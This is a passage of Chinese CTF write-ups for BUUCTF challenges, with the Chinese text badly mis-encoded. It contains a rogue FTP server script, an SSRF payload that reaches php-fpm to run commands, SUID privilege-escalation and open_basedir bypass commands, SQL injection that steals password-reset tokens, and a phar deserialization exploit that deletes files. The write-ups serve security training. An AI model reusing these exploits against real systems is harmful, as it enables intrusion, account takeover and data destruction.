ç„¶åå†è‡ªå·±vpsä¸Šä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ­å»ºä¸€ä¸ªæ¶æ„çš„ftpæœåŠ¡å™¨ï¼š import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 2000)) s.listen(1) conn, addr = s.accept() conn.send(b&#39;220 welcome\\n&#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b&#39;331 Please specify the password.\\n&#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b&#39;230 Login successful.\\n&#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b&#39;200 Switching to Binary mode.\\n&#39;) #Size / conn.send(b&#39;550 Could not get the file size.\\n&#39;) #EPSV (1) conn.send(b&#39;150 ok\\n&#39;) #PASV conn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#39;) #STOR / (2) conn.send(b&#39;150 Permission denied.\\n&#39;) #QUIT conn.send(b&#39;221 Goodbye.\\n&#39;) conn.close() åŒæ—¶ç›‘å¬3333ç«¯å£ã€‚ç”Ÿæˆæ”»å‡» php-fpm æ‰€éœ€è¦çš„è„šæœ¬ï¼š è§http://www.hackdig.com/05/hack-342091.htmå¤ªé•¿äº†å°±ä¸æ”¾äº† payloadï¼š 567bb380-8360-4aeb-b93c-cddea7970584.node3.buuoj.cn/add_api.php?backdoor=$file = $_GET[&#39;file&#39;];$data = $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file=ftp://121.x.x.x:2000&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 ä½†æ­¤æ—¶æƒé™è¿˜æ˜¯ä¸å¤Ÿï¼Œæ— æ³•è¯»å–flagï¼š SUID ææƒUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚ å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯è¡Œæ€§çš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š nmap vim find bash more less nano cp ä»¥ä¸‹å‘½ä»¤å¯ä»¥å‘ç°ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚ #ä»¥ä¸‹å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤ï¼Œä¸€ä¸ªä¸€ä¸ªè¯• find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb {} \\; åœ¨æœ¬é¢˜phpå°±æœ‰suidï¼Œç›´æ¥è¿›å…¥äº¤äº’æ¨¡å¼æ‰§è¡Œä»£ç ï¼Œå¾—åˆ°flagï¼š chdir(&#39;troy3e&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;); å‚è€ƒé“¾æ¥ï¼šhttps://ha1c9on.top/2021/04/29/lmb_one_pointer_php/https://www.anquanke.com/post/id/186186http://www.hackdig.com/05/hack-342091.htm","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"[çº¢æ˜è°·CTF 2021]EasyTP","slug":"çº¢æ˜è°·CTF-2021-EasyTP","date":"2021-04-27T03:50:38.000Z","updated":"2021-04-27T07:51:04.068Z","comments":true,"path":"2021/04/27/çº¢æ˜è°·CTF-2021-EasyTP/","link":"","permalink":"/2021/04/27/çº¢æ˜è°·CTF-2021-EasyTP/","excerpt":"","text":"BUUä¸Šæœ‰ç‚¹é—®é¢˜çš„é¢˜ç›®è¿˜æ˜¯å†™ä¸€ç¯‡åšå®¢å§ï¼Œç½‘ä¸Šæ‰¾äº†æ‰¾éƒ½æ²¡äººå†™ã€‚tp3è¿™ä¸ªé“¾çš„åˆ†æåœ¨æˆ‘çš„å¦ä¸€ç¯‡åšå®¢é‡Œï¼Œä¸è¿‡æ›´æ¨èçœ‹è¿™ä¸ªï¼šhttps://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVktäº†è§£åŸç†ä¹‹åå¼€å§‹åšé¢˜ã€‚ å¼€å¯æ¶æ„MySQLæœåŠ¡å™¨ï¼Œè®¾ç½®è¯»å–æ–‡ä»¶ä¸º/start.sh FLAG_PATH=/var/www/html/tp3.sql FLAG_MODE=M_SQL if [ ${ICQ_FLAG} ];then case $FLAG_MODE in &quot;M_ECHO&quot;) echo -n ${ICQ_FLAG} &gt; ${FLAG_PATH} FILE_MODE=755 chmod ${FILE_MODE} ${FLAG_PATH} ;; &quot;M_SED&quot;) #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; ${FLAG_PATH} sed -i -r &quot;s/flag\\\\{.*\\\\}/ ${ICQ_FLAG}/&quot; ${FLAG_PATH} ;; &quot;M_SQL&quot;) sed -i -r &quot;s/flag\\\\{.*\\\\}/${ICQ_FLAG}/&quot; ${FLAG_PATH} mysql -uroot -proot &lt; ${FLAG_PATH} rm -f ${FLAG_PATH} ;; *) ;; esac echo [+] ICQ_FLAG OK\\n unset ICQ_FLAG\\nelse\\n echo [!] no ICQ_FLAG\\nfi\\n å¾ˆä¹±ï¼Œæ‡’å¾—æ•´ç†äº†ã€‚æ€»ä¹‹flagåœ¨æ•°æ®åº“é‡Œï¼Œç”¨æˆ·åå¯†ç ä¸ºroot rootã€‚ç”¨æˆ·åå¯†ç ä¸ºroot rootã€‚ç”¨æˆ·åå¯†ç ä¸ºroot rootã€‚è¿™é‡Œbuuåº”è¯¥æ˜¯å°†æ¯”èµ›æ—¶é”™è¯¯çš„ç¯å¢ƒä¿®å¤è¿‡æ¥äº†ã€‚ï¼ˆæ¯”èµ›æ—¶æ˜¯123456 æŠ¥é”™æ³¨å…¥ï¼š updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1) //åœ¨è¿™ä¸€æ­¥æŸ¥å‡ºåº“æ˜¯teståå°†pocå¼€å¤´é‚£é‡Œdatabaseæ”¹ä¸ºtest updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;test&#39;),1,32),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;f1ag&#39;),1,32),0x7e),1) //è¿™ä¸€æ­¥æ— æ³•æ‰§è¡Œï¼Œåé¢å°±çŸ¥é“åŸå› äº†ã€‚ æˆ‘åœ¨æœ€åä¸€æ­¥è¯»å–flagçš„æ—¶å€™ä¸€ç›´æ˜¯ç™½å±ï¼Œæ³¨äº†å¥½ä¹…è¿˜æ˜¯ç™½å±ï¼Œå®åœ¨æƒ³ä¸æ˜ç™½åŸå› ã€‚åªèƒ½æ¢getshelläº†ï¼Œå†™ä¸ªä¸€å¥è¯ï¼Œèšå‰‘è¿ä¸Šå‘ç°æ²¡æ³•æ“ä½œæ•°æ®åº“ï¼Œæ¢å†°èï¼Œä¼ ä¸ªå†°èé©¬è¿ä¸Šå»ï¼šmysql://root:root@127.0.0.1:3306/mysqlç„¶è€Œè¿™é‡Œç›´æ¥æŸ¥çœ‹flagä¹Ÿæ˜¯çœ‹ä¸åˆ°çš„ï¼Œå¿…é¡»è¦å¯¼å‡ºæ¥æ‰èƒ½æŸ¥çœ‹ã€‚ æ³¨äº†ä¸€æ™šä¸Šç»“æœæ˜¯ä¸èƒ½æ³¨ã€‚ã€‚ã€‚ç»äº†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"[æŠ¤ç½‘æ¯ 2018]easy_laravel","slug":"æŠ¤ç½‘æ¯-2018-easy-laravel","date":"2021-04-20T13:24:26.000Z","updated":"2021-04-20T17:13:22.632Z","comments":true,"path":"2021/04/20/æŠ¤ç½‘æ¯-2018-easy-laravel/","link":"","permalink":"/2021/04/20/æŠ¤ç½‘æ¯-2018-easy-laravel/","excerpt":"","text":"é¢˜ç›®æ³¨é‡Šé‡Œçš„é“¾æ¥å·²ç»æŒ‚äº†ï¼ŒBUUç›´æ¥ç»™äº†æºç ï¼Œæ‹‰ä¸‹æ¥composer installç”Ÿæˆvendorç›®å½•ã€‚ï¼ˆæ²¡æ¢æºçš„è¯å¯èƒ½ä¼šè¿æ¥è¶…æ—¶ï¼‰ Artisanæ˜¯Laravelè‡ªå¸¦çš„å‘½ä»¤æ¥å£ã€‚php artisan listå¯ä»¥æŸ¥çœ‹php artisan å‘½ä»¤åˆ—è¡¨ï¼š å‘½ä»¤ è¯´æ˜ å¤‡æ³¨ php artisan make:resource ? åˆ›å»ºapiè¿”å›æ ¼å¼åŒ–èµ„æº &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan make:rule ? åˆ›å»ºvalidateè§„åˆ™ &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan make:exception ? åˆ›å»ºå¼‚å¸¸ç±» &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan make:factory ? åˆ›å»ºå·¥å‚ç±» &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan package:discover é‡ç½®åŒ…çš„ç¼“å­˜ä¿¡æ¯ &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan storage:link ï¼Ÿ Create a symbolic link from &quot;public/storage&quot; to &quot;storage/app/public&quot; &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan view:clear æ¸…æ¥šæ‰€æœ‰å·²ç¼–è¯‘çš„è§†å›¾æ–‡ä»¶ &gt;=5.4ç‰ˆæœ¬å¯ç”¨ php artisan clear-compiled æ¸…é™¤ç¼–è¯‘åçš„ç±»æ–‡ä»¶ php artisan down ä½¿åº”ç”¨ç¨‹åºè¿›å…¥ç»´ä¿®æ¨¡å¼ php artisan up é€€å‡ºåº”ç”¨ç¨‹åºçš„ç»´æŠ¤æ¨¡å¼ php artisan env æ˜¾ç¤ºå½“å‰æ¡†æ¶ç¯å¢ƒ php artisan fresh æ¸…é™¤åŒ…å«æ¡†æ¶å¤–çš„æ”¯æ¶ php artisan help æ˜¾ç¤ºå‘½ä»¤è¡Œçš„å¸®åŠ© php artisan list åˆ—å‡ºå‘½ä»¤ php artisan migrate è¿è¡Œæ•°æ®åº“è¿ç§» php artisan env æ˜¾ç¤ºå½“å‰æ¡†æ¶ç¯å¢ƒ php artisan optimize ä¸ºäº†æ›´å¥½çš„æ¡†æ¶å»ä¼˜åŒ–æ€§èƒ½ php artisan serve åœ¨phpå¼€å‘æœåŠ¡å™¨ä¸­æœåŠ¡è¿™ä¸ªåº”ç”¨ --port 8080ï¼Œ--host 0.0.0.0 php artisan tinker åœ¨åº”ç”¨ä¸­äº¤äº’ php artisan app:name ? è®¾ç½®åº”ç”¨ç¨‹åºå‘½åç©ºé—´ php artisan auth:clear-resets æ¸…é™¤è¿‡æœŸçš„å¯†ç é‡ç½®å¯†é’¥ æœªä½¿ç”¨è¿‡ php artisan cache:clear æ¸…é™¤åº”ç”¨ç¨‹åºç¼“å­˜ php artisan cache:table åˆ›å»ºä¸€ä¸ªç¼“å­˜æ•°æ®åº“è¡¨çš„è¿ç§» php artisan config:cache åˆ›å»ºä¸€ä¸ªåŠ è½½é…ç½®çš„ç¼“å­˜æ–‡ä»¶ php artisan config:clear åˆ é™¤é…ç½®çš„ç¼“å­˜æ–‡ä»¶ php artisan db:seed æ•°æ®åº“ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ® php artisan event:generate ç”Ÿæˆeventå’Œlisten éœ€è¦å®ç°é…ç½®eventserviceprivoder php artisan make:command ? åˆ›å»ºä¸€ä¸ªæ–°çš„å‘½ä»¤å¤„ç†ç¨‹åºç±» php artisan make:console ? ç”Ÿæˆä¸€ä¸ªArtisanå‘½ä»¤ php artisan key:generate è®¾ç½®ç¨‹åºå¯†é’¥ php artisan make:controller ? ç”Ÿæˆä¸€ä¸ªèµ„æºæ§åˆ¶ç±» php artisan make:middleware ? ç”Ÿæˆä¸€ä¸ªä¸­é—´ä»¶ php artisan make:migration ? ç”Ÿæˆä¸€ä¸ªè¿ç§»æ–‡ä»¶ php artisan make:model ? ç”Ÿæˆä¸€ä¸ªEloquent æ¨¡å‹ç±» php artisan make:provider ? ç”Ÿæˆä¸€ä¸ªæœåŠ¡æä¾›å•†çš„ç±» php artisan make:request ? ç”Ÿæˆä¸€ä¸ªè¡¨å•æ¶ˆæ¯ç±» php artisan migrate:install ? åˆ›å»ºä¸€ä¸ªè¿ç§»åº“æ–‡ä»¶ php artisan make:migration ? ç”Ÿæˆä¸€ä¸ªè¿ç§»æ–‡ä»¶ php artisan migrate:refresh ? å¤ä½å¹¶é‡æ–°è¿è¡Œæ‰€æœ‰çš„è¿ç§» php artisan migrate:reset ? å›æ»šå…¨éƒ¨æ•°æ®åº“è¿ç§» php artisan migrate:rollback ? å›æ»šæœ€åä¸€ä¸ªæ•°æ®åº“è¿ç§» php artisan migrate:status æ˜¾ç¤ºåˆ—è¡¨çš„è¿ç§» php artisan queue:failed åˆ—å‡ºå…¨éƒ¨å¤±è´¥çš„é˜Ÿåˆ—å·¥ä½œ php artisan queue:failed-table ? åˆ›å»ºä¸€ä¸ªè¿ç§»çš„å¤±è´¥çš„é˜Ÿåˆ—æ•°æ®åº“å·¥ä½œè¡¨ php artisan queue:flush æ¸…é™¤å…¨éƒ¨å¤±è´¥çš„é˜Ÿåˆ—å·¥ä½œ php artisan queue:forget ? åˆ é™¤ä¸€ä¸ªå¤±è´¥çš„é˜Ÿåˆ—å·¥ä½œ php artisan queue:listen ? ç›‘å¬ä¸€ä¸ªç¡®å®šçš„é˜Ÿåˆ—å·¥ä½œ php artisan queue:restart é‡å¯ç°åœ¨æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰é˜Ÿåˆ—å·¥ä½œ php artisan queue:retry é‡è¯•ä¸€ä¸ªå¤±è´¥çš„é˜Ÿåˆ—å·¥ä½œ php artisan queue:subscribe è®¢é˜…URL,æ”¾åˆ°é˜Ÿåˆ—ä¸Š php artisan queue:table åˆ›å»ºä¸€ä¸ªè¿ç§»çš„é˜Ÿåˆ—æ•°æ®åº“å·¥ä½œè¡¨ php artisan queue:work è¿›è¡Œä¸‹ä¸€ä¸ªé˜Ÿåˆ—ä»»åŠ¡ php artisan route:cache ä¸ºäº†æ›´å¿«çš„è·¯ç”±ç™»è®°ï¼Œåˆ›å»ºä¸€ä¸ªè·¯ç”±ç¼“å­˜æ–‡ä»¶ php artisan route:clear æ¸…é™¤è·¯ç”±ç¼“å­˜æ–‡ä»¶ php artisan route:list åˆ—å‡ºå…¨éƒ¨çš„æ³¨å†Œè·¯ç”± php artisan schedule:run è¿è¡Œé¢„å®šå‘½ä»¤ php artisan session:table åˆ›å»ºä¸€ä¸ªè¿ç§»çš„SESSIONæ•°æ®åº“å·¥ä½œè¡¨ php artisan vendor:publish å‘è¡¨ä¸€äº›å¯ä»¥å‘å¸ƒçš„æœ‰ç”¨çš„èµ„æºæ¥è‡ªæä¾›å•†çš„æ’ä»¶åŒ… baumåŒ…å‘½ä»¤ å‘½ä»¤ è¯´æ˜ å¤‡æ³¨ php artisan baum Get Baum version notice. php artisan baum:install ? Scaffolds a new migration and model suitable for Baum ä½¿ç”¨php artisan route:listæŸ¥çœ‹ä¸€ä¸‹å·²ç»å®šä¹‰çš„è·¯ç”±ï¼š æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥åœ¨routers/web.phpé‡ŒæŸ¥çœ‹ï¼š å…·ä½“çš„è·¯ç”±å¯ä»¥åœ¨ Illuminate/Routing/Router.php ä¸­æ‰¾åˆ° å¯ä»¥çœ‹åˆ°åŸºæœ¬æ‰€æœ‰æ“ä½œéƒ½éœ€è¦ç™»å½•ï¼Œå…ˆçœ‹UploadController å’Œ FlagControllerï¼Œä¸¤ä¸ªéƒ½ä½¿ç”¨äº†ä¸€ä¸ªå«åš admin çš„ä¸­é—´ä»¶ã€‚åœ¨ app/Http/Middleware/AdminMiddleware.php ä¸­å¯ä»¥çœ‹åˆ°ä»£ç ï¼š çœ‹åˆ°äº†ç®¡ç†å‘˜çš„é‚®ç®±ï¼Œå°è¯•æ–°æ³¨å†Œä¸€ä¸ªè¦†ç›–ï¼š æ˜¾ç¤ºå·²ç»æ³¨å†Œã€‚ä¸è¡Œï¼Œé‚£å°±æƒ³åŠæ³•è·å–ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚NoteControllerè¿™é‡Œä¼¼ä¹æœ‰ä¸ªsqlæ³¨å…¥ï¼š è¿™é‡Œæˆ‘è¯•äº†ä¸€ä¼šå„¿éƒ½æ˜¯ç›´æ¥æŠ¥é”™ï¼Œæ²¡åŠæ³•æ³¨å…¥ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒçš„å˜åŒ–ï¼Ÿ â€”â€”â€”â€”â€”â€”â€”â€”åè®°ï¼šåˆ—æ•°é”™äº†ï¼Œæ²¡ä»”ç»†çœ‹ã€‚ã€‚ã€‚ äº‹å®ä¸Šè¿™é‡Œä¹Ÿæ— æ³•æ³¨å‡ºç®¡ç†å‘˜å¯†ç ï¼Œåœ¨database/factories/ModelFactory.phpé‡Œï¼Œå‘Šè¯‰äº†æˆ‘ä»¬è¿™é‡Œå°±ç®—æ³¨å‡ºæ¥å¯†ç ä¹Ÿæ˜¯åŠ è¿‡å¯†çš„ã€‚ ä½†æ˜¯åœ¨laravel5.4ä¸­ï¼Œé‡ç½®å¯†ç çš„æ“ä½œå¾ˆæœ‰æ„æ€ Illuminate\\Auth\\Passwords\\PasswordBroker.phpé¦–å…ˆæ˜¯å‘é€é‡ç½®é“¾æ¥çš„æ–¹æ³• å¦‚æœç”¨æˆ·å­˜åœ¨çš„è¯ï¼Œä¼šæœ‰ä¸ªtokenï¼Œè¿™é‡Œè·Ÿè¿›ä¸€ä¸‹createã€‚ä»€ä¹ˆï¼Ÿè¿™æ˜¯notepadï¼Ÿé‚£æ²¡äº‹äº†ï¼ŒphpStormå¯åŠ¨ï¼ è¿™é‡Œç›´æ¥æŠŠæ–°ç”Ÿæˆçš„tokenå†™å…¥äº†æ•°æ®åº“ä¸­ã€‚æ€»ç»“ä¸€ä¸‹ï¼šå‘ç®¡ç†å‘˜é‚®ç®±å‘é€é‡ç½®å¯†ç çš„è¯·æ±‚ï¼ŒåŒæ—¶ç”Ÿæˆä¸€ä¸ªtokenå­˜å…¥æ•°æ®åº“ã€‚éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åæ³¨å‡ºæ›´æ”¹å¯†ç çš„tokenï¼Œæœ€åå®ç°ç›´æ¥æ›´æ”¹ç®¡ç†å‘˜çš„å¯†ç ã€‚å‘é€é‡ç½®è¯·æ±‚ï¼š è¿”å›500æ˜¯æˆåŠŸå‘é€ã€‚æ³¨å†Œä¸ªæ–°å·æ³¨å‡ºtokenï¼š42e06b61aa3a3206902b46785c9744e1bb0e07de494bfe74b65ee8f7217377af Troy3e&#39; union select 1,token,3,4,5 from password_resets order by created_at desc limit 1-- - è®°å¾—æŒ‰æ—¶é—´æ’åºï¼š é‡ç½®ç®¡ç†å‘˜å¯†ç ï¼š æˆåŠŸè¿›å…¥ï¼š ç…§ç†è¯´è®¿é—®flagåº”è¯¥å‡ºflagï¼Œä½†æ˜¯æ²¡æœ‰ï¼š è¿™é‡Œéœ€è¦å­¦ä¹ ä¸€ä¸‹bladeï¼šBlade æ˜¯ç”± Laravel æä¾›çš„éå¸¸ç®€å•ä½†åŠŸèƒ½å¼ºå¤§çš„æ¨¡æ¿å¼•æ“ï¼Œä¸åŒäºå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ï¼ŒBlade åœ¨è§†å›¾ä¸­å¹¶ä¸çº¦æŸä½ ä½¿ç”¨ PHP åŸç”Ÿä»£ç ã€‚æ‰€æœ‰çš„ Blade è§†å›¾æœ€ç»ˆéƒ½ä¼šè¢«ç¼–è¯‘æˆåŸç”Ÿ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ç›´åˆ°è¢«ä¿®æ”¹ï¼Œè¿™æ„å‘³ç€å¯¹åº”ç”¨çš„æ€§èƒ½è€Œè¨€ Blade åŸºæœ¬ä¸Šæ˜¯é›¶å¼€é”€ã€‚Blade è§†å›¾æ–‡ä»¶ä½¿ç”¨ .blade.php æ–‡ä»¶æ‰©å±•å¹¶å­˜æ”¾åœ¨ resources/views ç›®å½•ä¸‹ã€‚è¿™æ˜¯å› ä¸ºæ¨¡æ¿ç¼–è¯‘åçš„æ–‡ä»¶æ²¡æœ‰åˆ é™¤è€Œå¯¼è‡´æ— æ³•æ˜¾ç¤ºflagï¼Œå› æ­¤éœ€è¦åˆ é™¤ç¼–è¯‘åçš„æ¨¡æ¿æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“ç¼–è¯‘åçš„æ–‡ä»¶åï¼ˆIlluminate\\View\\Compilers\\Compiler.phpï¼‰ï¼š ç¼–è¯‘åæ–‡ä»¶çš„è·¯å¾„ç”±ä¸¤éƒ¨åˆ†æ„æˆç¬¬ä¸€éƒ¨åˆ†æ˜¯æ¨¡æ¿çš„ç»å¯¹è·¯å¾„pathï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯æ˜¯ç¼“å­˜è·¯å¾„ï¼Œåˆå› ä¸ºç¼“å­˜è·¯å¾„ä¸º/storage/framework/views/ï¼Œå…¶ä¸­/usr/share/nginx/html/æ˜¯nginxçš„é»˜è®¤webè·¯å¾„ï¼Œç”±æç¤ºçš„å¾—åˆ°ï¼Œpathä¸º/usr/share/nginx/html/resources/views/auth/flag.blade.phpçš„sha1å€¼ å³å¯ä»¥å¾—åˆ°ç¼–è¯‘åçš„æ–‡ä»¶çš„è·¯å¾„ï¼š /usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php é‚£ä¹ˆæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯åˆ æ‰è¿™ä¸ªæ–‡ä»¶ã€‚çœ‹åˆ°æ—è¾¹è¿˜æœ‰ä¸ªä¸Šä¼ åŠŸèƒ½ï¼š ä¸Šä¼ æˆåŠŸåˆ™ä¼ åˆ°app/publicï¼Œå¹¶ä¸”ä¸‹é¢checkå‡½æ•°å­˜åœ¨file_existså‡½æ•°ï¼Œå¯ä»¥è§¦å‘pharååºåˆ—åŒ–ã€‚ç„¶åå¯»æ‰¾åˆ é™¤æ–‡ä»¶çš„åœ°æ–¹ï¼Œå…¨å±€æœç´¢__destructï¼š swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php æ­£æ˜¯æˆ‘ä»¬è¦å¯»æ‰¾çš„åˆ é™¤å‡½æ•°ã€‚ exp: &lt;?php include(&#39;autoload.php&#39;); $a = serialize(new Swift_ByteStream_TemporaryFileByteStream()); var_dump(unserialize($a)); var_dump($a); $a = preg_replace(&#39;/\\/tmp\\/FileByteStream[\\w]{6}/&#39;, &quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a); //å°†å…¶æ¢æˆè¦åˆ é™¤çš„æ–‡ä»¶å $a = str_replace(&#39;s:25&#39;, &#39;s:90&#39;, $a); //ä¿®æ”¹å¯¹åº”çš„åºåˆ—åŒ–æ•°æ®é•¿åº¦ var_dump($a); $b = unserialize($a); $p = new Phar(&#39;./tr1ple.phar&#39;, 0); $p-&gt;startBuffering(); $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;); $p-&gt;setMetadata($b); $p-&gt;addFromString(&#39;test.txt&#39;,&#39;text&#39;); $p-&gt;stopBuffering(); rename(&#39;tr1ple.phar&#39;, &#39;tr1ple.gif&#39;) ?&gt; ä½†æ˜¯è¿™ä¸ªåœ¨BUUä¸Šæ˜¯æ‰“ä¸é€šçš„ï¼Œæˆ‘ä»”ç»†å¯¹æ¯”äº†buuç»™çš„expå’Œç½‘ä¸Šå¤ç°wpçš„åŒºåˆ«ï¼Œå‘ç°æ˜¯ç¼“å­˜æ–‡ä»¶åœ°å€çš„ä¸åŒï¼Œæ‰€ä»¥ç”¨ç½‘ä¸Šçš„é‚£ä¸ªæ˜¯æ²¡æ³•æˆåŠŸåˆ æ‰ç¼“å­˜æ–‡ä»¶çš„ã€‚expå°±ä¸æ”¾äº†ï¼ŒBUUè´´å‡ºæ¥äº†ï¼Œé“¾æ¥åœ¨ä¸‹é¢ã€‚ æƒ³äº†æƒ³å¯èƒ½æ˜¯è¿™ä¸ªå¯¼è‡´çš„ï¼š ä¸å»æ·±ç©¶äº†ï¼Œç†è§£å°±è¡Œã€‚ å¤ç°æ€è·¯ï¼šhttps://www.cnblogs.com/tr1ple/p/11044313.htmlhttps://github.com/CTFTraining/huwangbei_2018_easy_laravel/blob/master/exp/easy_laravel_exp.pyhttps://www.codercto.com/a/31804.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"[NCTF2019]phar matches everything","slug":"NCTF2019-phar-matches-everything","date":"2021-04-09T12:42:42.000Z","updated":"2021-04-09T14:30:08.377Z","comments":true,"path":"2021/04/09/NCTF2019-phar-matches-everything/","link":"","permalink":"/2021/04/09/NCTF2019-phar-matches-everything/","excerpt":"","text":"å…³é”®è¯ï¼špharååºåˆ—åŒ–ï¼›ssrfæ‰“php-fpm WPæœ¬æ¥ä¸æƒ³å‘çš„ï¼Œä½†æ˜¯è¿™é“é¢˜BUUçš„ç¯å¢ƒæœ‰ä¸€äº›å°å˜åŠ¨ã€‚å¸Œæœ›èƒ½å¸®åˆ°ä¸€äº›å¡ä½çš„äººã€‚å¹¶ä¸”è¿™é“é¢˜ä¹Ÿæœ‰å¾ˆå¤šå€¼å¾—å­¦ä¹ çš„åœ°æ–¹ã€‚ githubæŠŠæºç downä¸‹æ¥ï¼š catchmine.php &lt;?php class Easytest{ protected $test; public function funny_get(){ return $this-&gt;test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]); if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){ echo $this-&gt;curl($this-&gt;url); } } } if(isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_POST[&#39;name&#39;]); if($check !== false) { echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; } else { echo &quot;File is not an image.&quot;; } } ?&gt; upload.php &lt;?php $target_dir = &quot;uploads/&quot;; $uploadOk = 1; $imageFileType=substr($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],strrpos($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],&#39;.&#39;)+1,strlen($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;])); $file_name = md5(time()); $file_name =substr($file_name, 0, 10).&quot;.&quot;.$imageFileType; $target_file=$target_dir.$file_name; $check = 